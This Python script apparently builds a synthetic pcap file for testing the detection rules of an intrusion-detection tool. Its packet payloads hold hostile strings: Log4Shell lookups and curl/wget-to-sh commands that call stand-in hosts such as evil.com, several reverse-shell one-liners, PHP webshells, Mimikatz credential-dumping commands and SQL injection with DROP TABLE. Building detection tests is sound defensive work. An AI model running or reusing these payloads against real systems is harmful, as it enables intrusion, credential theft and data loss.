#!/usr/bin/env python3
"""
gen_test_pcap.py — Generate a .pcap file containing synthetic packets
that trigger every detection rule in TrafficAnalyzer.

Usage:
    python3 scripts/gen_test_pcap.py [output.pcap]

No external dependencies — uses only Python stdlib.
"""

import socket
import struct
import sys
import time

# ── PCAP file format helpers ──────────────────────────────────────────────────

PCAP_MAGIC   = 0xA1B2C3D4
PCAP_VERSION = (2, 4)
DLT_RAW      = 101   # raw IPv4, no link-layer header


def pcap_global_header() -> bytes:
    return struct.pack("<IHHiIII",
        PCAP_MAGIC,
        PCAP_VERSION[0],
        PCAP_VERSION[1],
        0,        # thiszone
        0,        # sigfigs
        65535,    # snaplen
        DLT_RAW,  # network (raw IP)
    )


def pcap_record(ts_sec: int, data: bytes) -> bytes:
    caplen = len(data)
    return struct.pack("<IIII", ts_sec, 0, caplen, caplen) + data


# ── Packet construction ───────────────────────────────────────────────────────

def ip_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack(f">{len(data)//2}H", data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def build_ipv4(src: str, dst: str, proto: int, payload: bytes) -> bytes:
    src_b = socket.inet_aton(src)
    dst_b = socket.inet_aton(dst)
    total_len = 20 + len(payload)
    hdr = struct.pack(">BBHHHBBH4s4s",
        0x45,       # version=4, ihl=5
        0,          # dscp/ecn
        total_len,
        0,          # identification
        0,          # flags/fragoffset
        64,         # ttl
        proto,
        0,          # checksum placeholder
        src_b,
        dst_b,
    )
    csum = ip_checksum(hdr)
    hdr = hdr[:10] + struct.pack(">H", csum) + hdr[12:]
    return hdr + payload


def tcp_checksum(src: str, dst: str, tcp_segment: bytes) -> int:
    pseudo = (
        socket.inet_aton(src)
        + socket.inet_aton(dst)
        + struct.pack(">BBH", 0, 6, len(tcp_segment))
    )
    data = pseudo + tcp_segment
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack(f">{len(data)//2}H", data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def build_tcp(src_ip: str, dst_ip: str,
              sport: int, dport: int,
              flags: int, payload: bytes) -> bytes:
    # flags: 0x02=SYN, 0x10=ACK, 0x18=PSH+ACK
    seq  = 1000
    ack  = 0 if (flags & 0x10 == 0) else 1
    seg  = struct.pack(">HHIIBBHHH",
        sport, dport,
        seq, ack,
        0x50,   # data offset = 5 (20 bytes), reserved=0
        flags,
        65535,  # window
        0,      # checksum placeholder
        0,      # urgent
    ) + payload
    csum = tcp_checksum(src_ip, dst_ip, seg)
    seg = seg[:16] + struct.pack(">H", csum) + seg[18:]
    return build_ipv4(src_ip, dst_ip, 6, seg)


def udp_checksum(src: str, dst: str, udp_segment: bytes) -> int:
    pseudo = (
        socket.inet_aton(src)
        + socket.inet_aton(dst)
        + struct.pack(">BBH", 0, 17, len(udp_segment))
    )
    data = pseudo + udp_segment
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack(f">{len(data)//2}H", data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    result = ~total & 0xFFFF
    return result if result != 0 else 0xFFFF


def build_udp(src_ip: str, dst_ip: str,
              sport: int, dport: int,
              payload: bytes) -> bytes:
    seg = struct.pack(">HHHH",
        sport, dport,
        8 + len(payload),
        0,  # checksum placeholder
    ) + payload
    csum = udp_checksum(src_ip, dst_ip, seg)
    seg = seg[:6] + struct.pack(">H", csum) + seg[8:]
    return build_ipv4(src_ip, dst_ip, 17, seg)


# ── Fake DNS query with a very long label (tunnelling heuristic) ──────────────

def build_dns_query(label: str) -> bytes:
    """Minimal DNS query for <label>.evil.com"""
    txid    = 0xBEEF
    flags   = 0x0100  # standard query, recursion desired
    qdcount = 1
    hdr = struct.pack(">HHHHHH", txid, flags, qdcount, 0, 0, 0)

    def encode_name(name: str) -> bytes:
        parts = name.split(".")
        encoded = b""
        for part in parts:
            encoded += struct.pack("B", len(part)) + part.encode()
        return encoded + b"\x00"

    question = encode_name(f"{label}.evil.com") + struct.pack(">HH", 1, 1)
    return hdr + question


# ── SYN flood to trigger port-scan detection ─────────────────────────────────

def build_syn_flood(src_ip: str, dst_ip: str, count: int = 25) -> list[bytes]:
    """SYN packets to 25 distinct ports — triggers the port-scan rule."""
    packets = []
    for port in range(1, count + 1):
        pkt = build_tcp(src_ip, dst_ip, 54321, port, 0x02, b"")
        packets.append(pkt)
    return packets


# ── Test cases ────────────────────────────────────────────────────────────────

ATTACKER = "10.0.0.1"
VICTIM   = "192.168.1.100"
HTTP_PORT = 80

CASES: list[tuple[str, bytes]] = [
    # ── CVE-2021-44228 Log4Shell ─────────────────────────────────────────────
    (
        "log4shell-ldap",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"GET /?x=${jndi:ldap://attacker.com/a} HTTP/1.1\r\nHost: victim\r\n\r\n")
    ),
    (
        "log4shell-rmi",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"GET / HTTP/1.1\r\nUser-Agent: ${jndi:rmi://evil.com/obj}\r\n\r\n")
    ),
    (
        "log4shell-dns",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"GET / HTTP/1.1\r\nX-Api-Version: ${jndi:dns://evil.com/x}\r\n\r\n")
    ),
    (
        "log4shell-obfuscated",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"GET / HTTP/1.1\r\nX-Forwarded-For: ${${::-j}${::-n}${::-d}${::-i}:ldap://x.y}\r\n\r\n")
    ),
    # ── CVE-2014-6271 ShellShock ─────────────────────────────────────────────
    (
        "shellshock",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"GET /cgi-bin/test.cgi HTTP/1.1\r\nUser-Agent: () { :;}; /bin/bash -c 'id'\r\n\r\n")
    ),
    # ── Reverse shells ───────────────────────────────────────────────────────
    (
        "revshell-bash-i",
        build_tcp(ATTACKER, VICTIM, 4444, 4444, 0x18,
            b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    ),
    (
        "revshell-dev-tcp",
        build_tcp(ATTACKER, VICTIM, 4444, 4444, 0x18,
            b"exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | /bin/sh")
    ),
    (
        "revshell-nc-e",
        build_tcp(ATTACKER, VICTIM, 54321, 4444, 0x18,
            b"nc -e /bin/sh 10.0.0.1 4444")
    ),
    (
        "revshell-python",
        build_tcp(ATTACKER, VICTIM, 54321, 4444, 0x18,
            b"python3 -c 'import socket,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)'")
    ),
    (
        "revshell-perl",
        build_tcp(ATTACKER, VICTIM, 54321, 4444, 0x18,
            b"perl -e 'use socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'")
    ),
    (
        "revshell-php",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"POST /shell.php HTTP/1.1\r\n\r\n<?php $s=fsockopen(\"10.0.0.1\",4444); ?>")
    ),
    (
        "revshell-ruby",
        build_tcp(ATTACKER, VICTIM, 54321, 4444, 0x18,
            b"ruby -rsocket -e \"require 'socket';TCPSocket.new('10.0.0.1',4444)\"")
    ),
    (
        "revshell-socat",
        build_tcp(ATTACKER, VICTIM, 54321, 4444, 0x18,
            b"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444")
    ),
    # ── PHP webshells ────────────────────────────────────────────────────────
    (
        "php-webshell-eval",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"POST /wp-content/uploads/shell.php HTTP/1.1\r\n\r\n<?php eval(base64_decode('aWQ=')); ?>")
    ),
    (
        "php-webshell-assert",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"POST /shell.php HTTP/1.1\r\n\r\n<?php assert(base64_decode('c3lzdGVtKCdpZCcp')); ?>")
    ),
    # ── Mimikatz ─────────────────────────────────────────────────────────────
    (
        "mimikatz-sekurlsa",
        build_tcp(ATTACKER, VICTIM, 54321, 4444, 0x18,
            b"privilege::debug\nsekurlsa::logonpasswords")
    ),
    (
        "mimikatz-lsadump",
        build_tcp(ATTACKER, VICTIM, 54321, 4444, 0x18,
            b"lsadump::sam /patch")
    ),
    (
        "mimikatz-kerberos",
        build_tcp(ATTACKER, VICTIM, 54321, 88, 0x18,
            b"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21")
    ),
    # ── Cobalt Strike ────────────────────────────────────────────────────────
    (
        "cobalt-strike-beacon",
        build_tcp(ATTACKER, VICTIM, 54321, 443, 0x18,
            b"POST /cobaltstrike/beacon HTTP/1.1\r\nHost: c2.evil.com\r\n\r\n\x00\x00")
    ),
    # ── SQL injection ────────────────────────────────────────────────────────
    (
        "sqli-union",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"GET /search?q=1'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1\r\n\r\n")
    ),
    (
        "sqli-drop",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"GET /admin?id=1;DROP+TABLE+users-- HTTP/1.1\r\n\r\n")
    ),
    # ── Command injection ────────────────────────────────────────────────────
    (
        "cmd-injection-wget",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"POST /api/update HTTP/1.1\r\n\r\nurl=http://evil.com/malware.sh | sh")
    ),
    (
        "cmd-injection-curl",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"POST /api/update HTTP/1.1\r\n\r\nurl=curl http://evil.com/implant.sh | sh")
    ),
    # ── Cleartext credential ─────────────────────────────────────────────────
    (
        "cleartext-password",
        build_tcp(ATTACKER, VICTIM, 54321, HTTP_PORT, 0x18,
            b"POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
            b"username=admin&password=SuperSecret123!")
    ),
    # ── C2 port ──────────────────────────────────────────────────────────────
    (
        "c2-known-port-4444",
        build_tcp(ATTACKER, VICTIM, 54321, 4444, 0x18,
            b"CONNECT back to C2")
    ),
    # ── DNS tunnelling ───────────────────────────────────────────────────────
    (
        "dns-tunneling",
        build_udp(ATTACKER, VICTIM, 53, 53,
            build_dns_query("aGVsbG8td29ybGQtdGhpcy1pcy1hLXZlcnktbG9uZy1sYWJlbC10dW5uZWw"))
    ),
]


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "test_attacks.pcap"

    port_scan_packets = build_syn_flood("192.168.99.1", VICTIM, count=25)

    ts = int(time.time())
    with open(out_path, "wb") as f:
        f.write(pcap_global_header())

        # Port-scan SYN flood
        for i, pkt in enumerate(port_scan_packets):
            f.write(pcap_record(ts + i, pkt))

        # All named cases
        for i, (name, pkt) in enumerate(CASES):
            f.write(pcap_record(ts + 100 + i, pkt))

    total = len(port_scan_packets) + len(CASES)
    print(f"[gen_test_pcap] wrote {total} packets ({len(CASES)} named cases + "
          f"{len(port_scan_packets)} SYN-flood) -> {out_path}")
    print(f"[gen_test_pcap] expected rules to trigger: port-scan + {len(CASES)} signatures")


if __name__ == "__main__":
    main()
